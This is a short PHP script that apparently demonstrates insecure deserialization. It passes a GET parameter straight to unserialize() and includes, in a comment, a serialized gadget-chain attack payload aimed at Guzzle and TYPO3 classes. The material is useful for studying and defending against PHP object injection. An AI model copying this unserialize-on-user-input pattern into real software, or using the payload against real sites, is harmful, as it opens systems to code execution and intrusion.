<?php
require_once '../vendor/autoload.php';

if (empty($_GET['payload'])) {
    // Regular payload:
    // a:2:{s:5:"first";s:4:"John";s:4:"last";s:3:"Doe";}
    $payload = serialize(['first' => 'John', 'last' => 'Doe']);
    header('Location: ?payload=' . rawurlencode($payload));
    exit;
}

// Attack payload:
// O:24:"GuzzleHttp\Psr7\FnStream":1:{s:9:"_fn_close";a:2:{i:0;O:60:"TYPO3\CMS\Frontend\
// ContentObject\Menu\ImageMenuContentObject":2:{s:7:"menuArr";a:0:{}s:5:"mconf";a:1:{s:
// 13:"debugItemConf";b:1;}}i:1;s:8:"generate";}}

echo '<h1>Payload</h1>';

var_dump(
    $_GET['payload']
);

echo '<hr>';
echo '<h1>Deserialization</h1>';

var_dump(
    unserialize($_GET['payload'])
);

echo '<hr>';
